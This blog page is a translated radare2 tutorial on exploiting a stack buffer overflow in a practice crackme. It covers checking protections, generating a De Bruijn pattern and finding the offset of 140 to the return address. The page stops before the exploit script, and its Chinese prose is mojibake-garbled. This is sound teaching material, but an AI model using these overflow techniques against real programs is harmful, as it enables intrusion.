<!DOCTYPE html>
<html lang="en">





<head><meta name="generator" content="Hexo 3.8.0">
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#005f6b">
  <meta name="description" content="Software Security Researcher">
  <meta name="author" content>
  <meta name="keywords" content>
  <title>ã€è¯‘ã€‘Radare2ä¹‹æ—…-Part2ï¼šExploitation - B3ale</title>

  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">


  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">

<link rel="stylesheet" href="/css/main.css">


  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">


<!-- è‡ªå®šä¹‰æ ·å¼ä¿æŒåœ¨æœ€åº•éƒ¨ -->


<link rel="alternate" href="/atom.xml" title="B3ale" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</head>


<body>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">&nbsp;<strong>B3ale</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/">Home</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/archives/">Archives</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/tags/">Tags</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/about/">About</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/links/">Links</a>
          </li>
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="view intro-2" id="background" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask rgba-black-light flex-center">
          <div class="container text-center white-text fadeInUp">
            <span class="h2" id="subtitle">
              
            </span>

            
              
                <p class="mt-3 post-meta">
                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
                  Saturday, February 23rd 2019, 11:18 am
                </p>
              

              <p class="mt-1">
                
                  
                  <span class="post-meta">
                    <i class="far fa-chart-bar"></i>
                    5.5k å­—
                  </span>
                

                
                  
                  <span class="post-meta">
                      <i class="far fa-clock"></i>
                      23 åˆ†é’Ÿ
                  </span>
                

                
              </p>
            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5 z-depth-3" id="board">
          <div class="post-content mx-auto" id="post">
            
            <div class="markdown-body">
              <p>ç¿»è¯‘è‡ª<a href="https://www.megabeets.net/a-journey-into-radare-2-part-2/" target="_blank" rel="noopener">Megabeets</a>ã€‚</p>
<a id="more"></a>
<h1 id="åºè¨€"><a href="#åºè¨€" class="headerlink" title="åºè¨€"></a>åºè¨€</h1><p>æ¬¢è¿æ¥åˆ°æˆ‘ä»¬<code>radare2</code>ä¹‹æ—…çš„ç¬¬äºŒéƒ¨åˆ†ï¼åœ¨è¿™ä¸€éƒ¨åˆ†ï¼Œæˆ‘ä»¬ä¼šæ¶µç›–<code>radare2</code>çš„æ›´å¤šéƒ¨åˆ†ï¼ŒåŒæ—¶è¿™æ¬¡æ›´æ³¨é‡äºäºŒè¿›åˆ¶æ¼æ´æŒ–æ˜ã€‚</p>
<p>ç›¸ä¿¡å¤§å®¶éƒ½ä¸€å®šå¾ˆæœŸå¾…è¿™ç¬¬äºŒéƒ¨åˆ†ï¼Œä¹‹åçš„å†…å®¹ä¹Ÿä¸€å®šä¼šæ›´å¿«åœ°åˆ†äº«ç»™å¤§å®¶ã€‚å¦‚æœä½ è¿˜æ²¡æœ‰é˜…è¯»è¿‡è¿™ä¸€ç³»åˆ—çš„<a href="https://www.megabeets.net/a-journey-into-radare-2-part-1/" target="_blank" rel="noopener">ç¬¬ä¸€éƒ¨åˆ†</a>ï¼Œæˆ‘éå¸¸æ¨èä½ å»è¯»ä¸€è¯»ã€‚ç¬¬ä¸€éƒ¨åˆ†è®°å½•äº†<code>radare2</code>çš„åŸºç¡€å†…å®¹ï¼ŒåŒæ—¶ä¹Ÿè§£é‡Šäº†å¾ˆå¤šæˆ‘ä»Šå¤©ä¼šç”¨åˆ°çš„å‘½ä»¤ã€‚</p>
<p>åœ¨è¿™ä¸€éƒ¨åˆ†ï¼Œæˆ‘ä»¬çš„ç›®çš„æ˜¯å¯¹ä¸€ä¸ªç®€å•çš„ç¨‹åºè¿›è¡Œæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨ã€‚<code>radare2</code>æœ‰å¾ˆå¤šä¸åŒçš„åŠŸèƒ½å¯ä»¥å¸®æˆ‘ä»¬å¯¹æ¼æ´è¿›è¡Œåˆ©ç”¨ï¼Œä¾‹å¦‚ä¿æŠ¤æŠ€æœ¯ã€æŸ¥æ‰¾ ROPã€ç”Ÿæˆéšæœºåºåˆ—ã€æŸ¥çœ‹å¯„å­˜å™¨å†…å®¹ç­‰ç­‰ã€‚ä½ å¯ä»¥åœ¨æœ¬æ–‡æœ«å°¾æ‰¾åˆ°ä¸€ä»½å‘½ä»¤å¯¹åº”è¡¨ã€‚ä»Šå¤©æˆ‘ä¼šå‘ä½ ä»¬å±•ç¤ºè¿™äº›å¼ºå¤§çš„åŠŸèƒ½ï¼ŒåŒæ—¶æˆ‘ä»¬ç”¨<code>radare2</code>æ¥ç»•è¿‡åœ¨å¼€å¯<code>ASLR</code>çš„ç³»ç»Ÿä¸Šè¿è¡Œå¹¶ä¸”æœ‰<code>NX</code>ä¿æŠ¤çš„ç¨‹åºã€‚æˆ‘å‡è®¾å¤§å®¶éƒ½å·²ç»æŒæ¡äº†ä»¥ä¸‹çš„é¢„å¤‡çŸ¥è¯†ï¼š</p>
<ul>
<li>æ±‡ç¼–è¯­è¨€</li>
<li>ç¨‹åºä¿æŠ¤æŠ€æœ¯ï¼ˆ<code>NX</code>ã€<code>ASLR</code>ï¼‰</li>
<li><a href="https://en.wikipedia.org/wiki/Call_stack" target="_blank" rel="noopener">æ ˆå¸§ç»“æ„</a></li>
<li><a href="https://en.wikipedia.org/wiki/Buffer_overflow" target="_blank" rel="noopener">ç¼“å†²åŒºæº¢å‡º</a></li>
<li><a href="https://en.wikipedia.org/wiki/Return-oriented_programming" target="_blank" rel="noopener">é¢å‘è¿”å›ç¼–ç¨‹</a></li>
<li><a href="https://en.wikipedia.org/wiki/X86_calling_conventions" target="_blank" rel="noopener">x86 è°ƒç”¨çº¦å®š</a></li>
</ul>
<p>ç†Ÿæ‚‰è¿™äº›çŸ¥è¯†æ˜¯å¾ˆé‡è¦çš„ä¸€æ­¥ï¼Œå› ä¸ºæ–‡ç« ä¸­æˆ‘å¹¶ä¸ä¼šç»†è®²ï¼Œç”šè‡³ä¸ä¼šå¯¹å…¶è§£é‡Šã€‚</p>
<p><img src="https://www.megabeets.net/uploads/r2_part1_2.png" srcset="/img/loading.gif" alt></p>
<h1 id="æ›´æ–°radare2"><a href="#æ›´æ–°radare2" class="headerlink" title="æ›´æ–°radare2"></a>æ›´æ–°<code>radare2</code></h1><p>é¦–å…ˆï¼Œæˆ‘ä»¬å°†<code>radare2</code>æ›´æ–°è‡³å…¶ git çš„æœ€æ–°ç‰ˆç‰ˆï¼š</p>
<pre><code class="shell">$ git clone https://github.com/radare/radare2.git # å¦‚æœä½ è¿˜æ²¡æœ‰å…‹éš†ä¸‹æ¥çš„è¯
$ cd radare2
$ ./sys/install.sh
</code></pre>
<p>ç­‰å¾…æ›´æ–°å®Œæˆéœ€è¦å¾ˆé•¿ä¸€æ®µæ—¶é—´ï¼Œåœ¨è¿™æœŸé—´ä¸å¦‚çœ‹äº›è§†é¢‘æ”¾æ¾ä¸€ä¼šå„¿ã€‚</p>
<h1 id="ç†Ÿæ‚‰ç¨‹åº"><a href="#ç†Ÿæ‚‰ç¨‹åº" class="headerlink" title="ç†Ÿæ‚‰ç¨‹åº"></a>ç†Ÿæ‚‰ç¨‹åº</h1><p>ä½ å¯ä»¥åœ¨è¿™é‡Œä¸‹è½½<a href="https://github.com/ITAYC0HEN/A-journey-into-Radare2/blob/master/Part%202%20-%20Exploitation/megabeets_0x2" target="_blank" rel="noopener">ç¨‹åº</a>ï¼Œåœ¨è¿™é‡Œä¸‹è½½<a href="https://github.com/ITAYC0HEN/A-journey-into-Radare2/blob/master/Part%202%20-%20Exploitation/megabeets_0x2.c" target="_blank" rel="noopener">æºç </a>ã€‚<br>å¦‚æœä½ æƒ³è‡ªå·±ç¼–è¯‘ç¨‹åºï¼Œç”¨ä»¥ä¸‹å‘½ä»¤ï¼š</p>
<pre><code class="shell">$ gcc -m32  -fno-stack-protector megabeets_0x2.c -o megabeets_0x2
</code></pre>
<p>è¿™æ¬¡çš„ç¨‹åºä¸ä¸Šä¸€æ¬¡çš„ç¨‹åºéå¸¸ç›¸ä¼¼ï¼Œåªæ˜¯åœ¨<code>main()</code>å‡½æ•°ä¸­æœ‰ä¸€äº›ç»†å¾®çš„æ”¹å˜ï¼š</p>
<ul>
<li>ç¼–è¯‘æ—¶ä¸ä½¿ç”¨å‚æ•°<code>-z execstac</code>æ¥å¼€å¯<code>NX</code></li>
<li>é€šè¿‡ scanf æ¥æ¥æ”¶ç”¨æˆ·çš„è¾“å…¥ï¼Œè€Œä¸æ˜¯é€šè¿‡ç¨‹åºçš„å‚æ•°</li>
<li>å¤§éƒ¨åˆ†è¾“å‡ºçš„å‡½æ•°ä¸º puts</li>
<li>å¯¹ç¨‹åºçš„è¾“å‡ºåšäº†ä¸€ç‚¹ä¿®æ”¹</li>
</ul>
<p>è¿™æ˜¯ä¹‹å‰çš„<code>main()</code>å‡½æ•°ï¼š</p>
<pre><code class="cpp">int main(int argc, char *argv[])
{
    printf(&quot;\n  .:: Megabeets ::.\n&quot;);
    printf(&quot;Think you can make it?\n&quot;);
    if (argc &gt;= 2 &amp;&amp; beet(argv[1]))
    {
        printf(&quot;Success!\n\n&quot;);
    }
    else
        printf(&quot;Nop, Wrong argument.\n\n&quot;);

    return 0;
}
</code></pre>
<p>ç„¶åç°åœ¨çš„<code>main</code>å‡½æ•°æ˜¯è¿™æ ·çš„ï¼š</p>
<pre><code class="cpp">int main(int argc, char *argv[])
{
    char *input;
    puts(&quot;\n  .:: Megabeets ::.\n&quot;);
    puts(&quot;Show me what you got:&quot;);

    scanf(&quot;%ms&quot;, &amp;input);
    if (beet(input))
    {
        printf(&quot;Success!\n\n&quot;);
    }
    else
        puts(&quot;Nop, Wrong argument.\n\n&quot;);

    return 0;
}
</code></pre>
<p>ç¨‹åºçš„åŠŸèƒ½ååˆ†ç®€å•ï¼Œå¹¶ä¸”åœ¨å‰ä¸€ç¯‡æ–‡ç« ä¸­æˆ‘ä»¬å·²ç»å¯¹å®ƒå¾ˆç†Ÿæ‚‰äº†â€”â€”è¦æ±‚è¾“å…¥å­—ç¬¦ä¸²ï¼Œä¸ç»è¿‡<code>rot13</code>åŠ å¯†çš„å­—ç¬¦ä¸²<code>Megabeets</code>æ¯”è¾ƒã€‚æ•…è¾“å…¥åº”è¯¥ä¸º<code>Zrtnorrgf</code>ã€‚</p>
<pre><code class="shell">$ ./megabeets_0x2

  .:: Megabeets ::.

Show me what you got:
blablablabla
Nop, Wrong argument.

$ ./megabeets_0x2

  .:: Megabeets ::.

Show me what you got:
Zrtnorrgf
Success!
</code></pre>
<p>è¿™äº›éƒ½å¾ˆç®€å•ï¼Œä½†æ˜¯æˆ‘ä»¬ä»Šå¤©çš„é‡ç‚¹å¹¶ä¸æ˜¯ç ´è§£ä¸€ä¸ªç®€å•çš„ crackmeï¼Œè€Œæ˜¯å¯¹å…¶è¿›è¡Œæ¼æ´åˆ©ç”¨ã€‚é‚£æˆ‘ä»¬å¼€å§‹å§ï¼</p>
<h1 id="ç†è§£æ¼æ´"><a href="#ç†è§£æ¼æ´" class="headerlink" title="ç†è§£æ¼æ´"></a>ç†è§£æ¼æ´</h1><p>å¯¹äºæ¯ä¸€ä¸ª PWN é¢˜ç»™å‡ºçš„ç¨‹åºæ¥è¯´ï¼Œæ£€æŸ¥ç¨‹åºå¼€äº†ä»€ä¹ˆä¿æŠ¤æ˜¯ä¸€ä¸ªå¥½ä¹ æƒ¯ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸Šä¸€ç¯‡æ–‡ç« ä¸­æåˆ°çš„<code>rabin2</code>ï¼Œæˆ–è€…ç›´æ¥åœ¨<code>radare2</code>çš„ shell é‡Œæ‰§è¡Œ<code>i</code>å‘½ä»¤ã€‚å› ä¸ºæˆ‘ä»¬è¿˜æ²¡æœ‰ç”¨<code>radare2</code>æ‰“å¼€æ–‡ä»¶ï¼Œå°±å…ˆç”¨<code>rabin2</code>æ¥çœ‹çœ‹ï¼š</p>
<pre><code class="shell">$ rabin2 -I megabeets_0x2

arch     x86
binsz    6072
bintype  elf
bits     32
canary   false
class    ELF32
crypto   false
endian   little
havecode true
intrp    /lib/ld-linux.so.2
lang     c
linenum  true
lsyms    true
machine  Intel 80386
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    NONE
static   false
stripped false
subsys   linux
va       true
</code></pre>
<p>åœ¨æ ‡è®°çš„å‡ è¡Œä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç¨‹åºå¼€äº†<code>NX</code>ï¼Œä¹Ÿå°±æ˜¯è¯´æ ˆæ˜¯ä¸å¯æ‰§è¡Œçš„ã€‚è¿˜æœ‰ï¼Œè¯¥ç¨‹åºæ²¡æœ‰å¼€å¯<a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries" target="_blank" rel="noopener"><code>Canary</code></a>ã€<a href="https://en.wikipedia.org/wiki/Position-independent_code" target="_blank" rel="noopener"><code>PIC</code></a>æˆ–æ˜¯<a href="https://tk-blog.blogspot.co.il/2009/02/relro-not-so-well-known-memory.html" target="_blank" rel="noopener"><code>RELRO</code></a>ã€‚</p>
<p>ç°åœ¨æˆ‘ä»¬è¿…é€Ÿåœ°è¿‡ä¸€éç¨‹åºçš„æ‰§è¡Œæµï¼Œè¿™æ¬¡æˆ‘ä»¬çœ‹ä¸€çœ‹å®ƒçš„åæ±‡ç¼–ä»£ç ï¼ˆå¹¶ä¸æ˜¯æ¯æ¬¡æ¼æ´æŒ–æ˜éƒ½èƒ½æœ‰æºç ï¼‰ã€‚ä½¿ç”¨<code>radare2</code>çš„è°ƒè¯•æ¨¡å¼æ‰“å¼€ç¨‹åºï¼š</p>
<pre><code class="shell">$ r2 -d megabeets_0x2
Process with PID 20859 startedâ€¦
= attach 20859 20859
bin.baddr 0x08048000
Using 0x8048000
Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2
asm.bits 32â€“ Your endian swaps
[0xf7782b30]&gt; aas
</code></pre>
<blockquote>
<ul>
<li><code>-d</code> â€“ ç”¨è°ƒè¯•æ¨¡å¼æ‰“å¼€</li>
<li><code>aas</code> â€“ åˆ†æå‡½æ•°ã€ç¬¦å·ä»¥åŠå…¶ä»–</li>
<li>æ³¨æ„ï¼šæ­£å¦‚æˆ‘åœ¨å‰ä¸€ç¯‡æ–‡ç« æ‰€æåˆ°çš„ï¼Œå¼€å§‹æ—¶ä½¿ç”¨<code>aaa</code>åˆ†ææ˜¯æœ€æ¨èçš„æ–¹å¼ï¼Œå› ä¸ºåˆ†ææœ¬æ¥å°±æ˜¯ä¸€ä¸ªå¾ˆå¤æ‚çš„è¿‡ç¨‹ã€‚æˆ‘åœ¨<a href="https://reverseengineering.stackexchange.com/a/16115/18698" target="_blank" rel="noopener">è¿™ç¯‡å›ç­”</a>é‡Œå†™äº†æ›´å¤šâ€”â€”è¯»ä¸€ä¸‹ä¹Ÿè®¸ä¼šè®©ä½ çš„ç†è§£æ›´æ·±ã€‚</li>
</ul>
</blockquote>
<p>ç°åœ¨æˆ‘ä»¬ç»§ç»­æ‰§è¡Œç¨‹åºï¼Œç›´åˆ°<code>main</code>å‡½æ•°ã€‚åªè¦è¾“å…¥å‘½ä»¤<code>dcu main</code>ï¼š</p>
<pre><code class="shell">[0xf7797b30]&gt; dcu?
|Usage: dcu Continue until address
| dcu address      Continue until address
| dcu [..tail]     Continue until the range
| dcu [from] [to]  Continue until the range
[0xf7797b30]&gt; dcu main
Continue until 0x08048658 using 1 bpsize
hit breakpoint at: 8048658
</code></pre>
<blockquote>
<ul>
<li><code>dcu</code>ä»£è¡¨<code>debug continue until</code></li>
</ul>
</blockquote>
<p>ç°åœ¨è®©æˆ‘ä»¬è¾“å…¥<code>VV</code>è¿›å…¥å›¾å½¢æ¨¡å¼ã€‚åœ¨ç¬¬ä¸€éƒ¨åˆ†è§£é‡Šè¿‡ï¼Œä½ å¯ä»¥é€šè¿‡<code>p</code>å’Œ<code>P</code>åˆ‡æ¢è§†è§’ï¼Œé€šè¿‡<code>k</code>/<code>j</code>/<code>h</code>/<code>l</code>åˆ†åˆ«å‘ä¸Š/ä¸‹/å·¦/å³ç§»åŠ¨ï¼Œé€šè¿‡<code>g</code>å’Œè°ƒç”¨æ—çš„å­—æ¯è·³è½¬å‡½æ•°ï¼ˆä¾‹å¦‚<code>gd</code>ï¼‰ã€‚</p>
<p>ç”¨<code>?</code>æ¥åˆ—å‡ºæ‰€æœ‰åœ¨å›¾å½¢æ¨¡å¼ä¸‹çš„å‘½ä»¤ï¼ŒåŒæ—¶åˆ«å¿˜è®°<code>R</code>å‘½ä»¤ ğŸ˜‰</p>
<p><img src="https://www.megabeets.net/uploads/mainsym.png" srcset="/img/loading.gif" alt></p>
<p><code>main()</code>å‡½æ•°æ˜¯ç¨‹åºè¦æ±‚æˆ‘ä»¬è¾“å…¥çš„åœ°æ–¹ï¼Œå¹¶ä¸”å®ƒå°†è¾“å…¥ä¼ ç»™<code>sym.beet</code>ã€‚é€šè¿‡<code>gc</code>æˆ‘ä»¬è·³è½¬åˆ°å¤„ç†æˆ‘ä»¬è¾“å…¥çš„<code>beet()</code>å‡½æ•°ï¼š</p>
<p><img src="https://www.megabeets.net/uploads/beetsym.png" srcset="/img/loading.gif" alt></p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç”¨æˆ·çš„è¾“å…¥<code>[arg_8h]</code>è¢«å¤åˆ¶ç»™ä¸€ä¸ªç¼“å†²åŒºï¼ˆ<code>[local_88h]</code>ï¼‰ï¼Œç„¶åå°±æ˜¯æˆ‘ä»¬åœ¨å‰ä¸€ç¯‡æ–‡ç« ä¸­æ‰€çœ‹åˆ°è¿‡çš„ï¼Œå­—ç¬¦ä¸²<code>Megabeets</code>ç”¨<code>rot13</code>åŠ å¯†äº†ï¼Œæ‰€å¾—ç»“æœä¸æˆ‘ä»¬çš„è¾“å…¥åšæ¯”è¾ƒã€‚æˆ‘ä»¬ä¹‹å‰äº†è§£è¿‡ï¼Œæˆ‘è¿™é‡Œå°±ä¸åšæ·±ç©¶ã€‚</p>
<p>ä½ æœ‰çœ‹åˆ°ä»€ä¹ˆå¯ä»¥çš„åœ°æ–¹å—ï¼Ÿæˆ‘ä»¬çš„è¾“å…¥æ²¡æœ‰å¯¹é•¿åº¦åšæ£€æŸ¥ï¼Œç„¶åç›´æ¥å¤åˆ¶åˆ°äº†ç¼“å†²åŒºä¸­ã€‚è¿™æ„å‘³ç€å¦‚æœæˆ‘ä»¬è¾“å…¥ä¸€ä¸²è¶…è¿‡ç¼“å†²åŒºå¤§å°çš„å­—ç¬¦ä¸²ï¼Œå°±èƒ½å¯¼è‡´æ ˆä¸Šçš„ç¼“å†²åŒºæº¢å‡ºã€‚è‡³æ­¤ï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†æ¼æ´ã€‚</p>
<h1 id="è§„åˆ’æ¼æ´åˆ©ç”¨è„šæœ¬"><a href="#è§„åˆ’æ¼æ´åˆ©ç”¨è„šæœ¬" class="headerlink" title="è§„åˆ’æ¼æ´åˆ©ç”¨è„šæœ¬"></a>è§„åˆ’æ¼æ´åˆ©ç”¨è„šæœ¬</h1><p>æ—¢ç„¶æˆ‘ä»¬å·²ç»æ‰¾åˆ°äº†æœ‰æ¼æ´çš„å‡½æ•°ï¼Œæˆ‘ä»¬éœ€è¦æ„é€ ä¸€ä¸ª payload æ¥åˆ©ç”¨å®ƒã€‚æˆ‘ä»¬çš„ç›®æ ‡å¾ˆæ˜äº†ï¼Œå°±æ˜¯åœ¨ç³»ç»Ÿä¸ŠæˆåŠŸå¼€ä¸€ä¸ª shellã€‚é¦–å…ˆï¼Œæˆ‘ä»¬è¦ç¡®è®¤ç¡®å®æœ‰ä¸€ä¸ªæœ‰æ¼æ´çš„å‡½æ•°ï¼Œç„¶åæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªæˆ‘ä»¬çš„ payload å¯ä»¥è¦†ç›–æ ˆçš„åç§»ã€‚</p>
<p><img src="https://www.megabeets.net/uploads/tumblr_m5vxpy8Cs41qfoh4t.gif" srcset="/img/loading.gif" alt></p>
<p>æˆ‘ä»¬å°†ä¼šä½¿ç”¨ä¸€ä¸ª<code>radare2</code>æ¡†æ¶ä¸­çš„å·¥å…·ï¼Œå«åš<code>ragg2</code>ã€‚å®ƒèƒ½å¤Ÿä¸ºæˆ‘ä»¬ç”Ÿæˆä¸€æ®µå¾ªç¯çš„<a href="https://en.wikipedia.org/wiki/De_Bruijn_sequence" target="_blank" rel="noopener">å¾·å¸ƒé²å› åºåˆ—</a>ï¼Œç”¨æ¥æ£€æµ‹è¦†ç›–ç¼“å†²åŒºçš„ç¡®åˆ‡çš„åç§»å¤§å°ã€‚</p>
<pre><code class="shell">$ ragg2 -
&lt;truncated&gt;
 -P [size]       prepend debruijn pattern
&lt;truncated&gt;
 -r              show raw bytes instead of hexpairs
&lt;truncated&gt;

$ ragg2 -P 100 -r
AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh
</code></pre>
<p>æˆ‘ä»¬çŸ¥é“æˆ‘ä»¬çš„ç¨‹åºé€šè¿‡è¾“å…¥æµè¯»å–æˆ‘ä»¬çš„è¾“å…¥ï¼Œè€Œä¸æ˜¯ä» shell ä¸­è¯»å–æˆ‘ä»¬çš„è¾“å…¥ã€‚æ•…æˆ‘ä»¬å°†ä¼šä½¿ç”¨åˆä¸€ä¸ªæ¥è‡ª<code>radare2</code>å·¥å…·ç®±ä¸­çš„å·¥å…·ï¼Œ<code>rarun2</code>ã€‚</p>
<blockquote>
<ul>
<li><p><code>rarun2</code>å¯ä»¥åœ¨ä¸åŒç¯å¢ƒã€å‚æ•°ã€æ‰§è¡Œæƒé™ã€æ–‡ä»¶å¤¹ä¸‹è¿è¡Œç¨‹åºï¼Œå¹¶ä¸”è¦†ç›–é»˜è®¤çš„æ–‡ä»¶æè¿°ç¬¦ï¼ˆä¾‹å¦‚<code>stdin</code>ï¼‰</p>
</li>
<li><p>å¦‚æœä½ éœ€è¦åœ¨è·‘ä¸€ä¸ªç¨‹åºæ—¶ä½¿ç”¨å¾ˆé•¿çš„å‚æ•°ï¼Œå®ƒä¼šèµ·å¾ˆå¤§çš„ä½œç”¨ã€‚è€Œä¸”æ¼æ´åˆ©ç”¨é€šå¸¸éƒ½ä¼šå‘è¾“å…¥æµä¼ ä¸€å¤§å †æ•°æ®ã€‚</p>
</li>
</ul>
</blockquote>
<p>æˆ‘ä»¬éœ€è¦åšä»¥ä¸‹çš„ä¸‰ä¸ªæ­¥éª¤ï¼š</p>
<ul>
<li>ä½¿ç”¨<code>ragg2</code>å°†å¾·å¸ƒé²å› åºåˆ—å†™å…¥ä¸€ä¸ªæ–‡ä»¶</li>
<li>æ–°å»ºä¸€ä¸ª<code>rarun2</code>é…ç½®æ–‡ä»¶ï¼Œå¹¶ä¸”æŠŠå‰ä¸€ä¸ªæ–‡ä»¶ä½œä¸º<code>stdin</code></li>
<li>è®©<code>radare2</code>æ¥æ‰¾åˆ°åç§»</li>
</ul>
<pre><code class="shell">$ ragg2 -P 200 -r &gt; pattern.txt
$ cat pattern.txt
AAABAACAADAAEAAFAAGAAHAAIâ€¦ &lt;truncated&gt; â€¦7AA8AA9AA0ABBABCABDABEABFA

$ vim profile.rr2

$ cat profile.rr2
#!/usr/bin/rarun2
stdin=./pattern.txt

$ r2 -r profile.rr2 -d megabeets_0x2
Process with PID 21663 startedâ€¦
= attach 21663 21663
bin.baddr 0x08048000
Using 0x8048000
Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2
asm.bits 32

â€” Use rarun2 to launch your programs with a predefined environment.
[0xf77c2b30]&gt; dc
Selecting and continuing: 21663

.:: Megabeets ::.

Show me what you got?
child stopped with signal 11

[0x41417641]&gt;
</code></pre>
<p>æˆ‘ä»¬è¿è¡Œç¨‹åºï¼Œå¹¶å°†<em>pattern.txt</em>çš„å†…å®¹ç”¨<code>rarun2</code>ä¼ ç»™<code>stdin</code>ï¼Œ<em>SIGSEV 11</em>ã€‚</p>
<blockquote>
<ul>
<li><p>ä¸€ä¸ªä¿¡å·æ˜¯ä¸€ç§å‘é€ç»™è¿›ç¨‹æˆ–æ˜¯ä¸€ä¸ªå…·ä½“çº¿ç¨‹çš„å¼‚æ­¥é€šçŸ¥ï¼Œè¿™æ ·ä¸ä¹‹ç›¸åŒçš„è¿›ç¨‹å°±ä¼šåœ¨æŸä¸ªäº‹ä»¶å‘ç”Ÿæ—¶å¾—åˆ°æé†’ã€‚</p>
</li>
<li><p>SIGSEGVï¼ˆ11ï¼‰ä¿¡å·åœ¨è®¿é—®äº†æŸä¸ªæ— æ•ˆçš„è™šæ‹Ÿå†…å­˜æˆ–æ®µé”™è¯¯åä¼šè§¦å‘ã€‚</p>
</li>
</ul>
</blockquote>
<p>ä½ å‘ç°äº†å—ï¼Ÿæˆ‘ä»¬å®æ—¶çš„æŒ‡é’ˆç°åœ¨æŒ‡å‘äº†<code>0x41417641</code>ã€‚è¿™æ˜¯ä¸€ä¸ªæ— æ•ˆçš„åœ°å€ï¼Œå®ƒè¡¨ç¤ºäº†å­—ç¬¦ä¸²<code>AvAA</code>ï¼ˆå°ç«¯åºåŠ ascii ç è½¬æ¢ï¼‰ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬é€çš„å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ã€‚<code>radare2</code>å…è®¸æˆ‘ä»¬æ‰¾åˆ°ç»™å‡ºçš„å€¼åœ¨å¾·å¸ƒé²å› åºåˆ—ä¸­çš„åç§»ã€‚</p>
<pre><code class="shell">[0x41417641]&gt; wop?
|Usage: wop[DO] len @ addr | value
| wopD len [@ addr]  Write a De Bruijn Pattern of length â€˜lenâ€™ at address â€˜addrâ€™
| wopO value         Finds the given value into a De Bruijn Pattern at current offset
[0x41417641]&gt; wopO `dr eip`
140
</code></pre>
<p>æ—¢ç„¶æˆ‘ä»¬å·²ç»çŸ¥é“éœ€è¦è¦†ç›–è¿”å›åœ°å€çš„åç§»ä¸º 140ï¼Œæˆ‘ä»¬å¯ä»¥å¼€å§‹ç¼–å†™è„šæœ¬äº†ã€‚</p>
<h1 id="ç¼–å†™æ¼æ´åˆ©ç”¨è„šæœ¬"><a href="#ç¼–å†™æ¼æ´åˆ©ç”¨è„šæœ¬" class="headerlink" title="ç¼–å†™æ¼æ´åˆ©ç”¨è„šæœ¬"></a>ç¼–å†™æ¼æ´åˆ©ç”¨è„šæœ¬</h1><p>æˆ‘ä¹‹å‰ä¹Ÿæåˆ°è¿‡å¾ˆå¤šæ¬¡ï¼Œè¿™ç¯‡æ–‡ç« ä¸æ˜¯æ•™ä¸€äº›æ¼æ´åˆ©ç”¨çš„åŸºç¡€çŸ¥è¯†çš„ï¼Œå®ƒçš„ç›®çš„æ˜¯å±•ç¤º<code>radare2</code>åœ¨æ¼æ´åˆ©ç”¨ä¸­æ˜¯å¦‚ä½•ä½¿ç”¨çš„ã€‚å› æ­¤ï¼Œæˆ‘ä¸ä¼šè¿‡å¤šåœ°è§£é‡Šè„šæœ¬çš„æ¯ä¸ªéƒ¨åˆ†ã€‚</p>
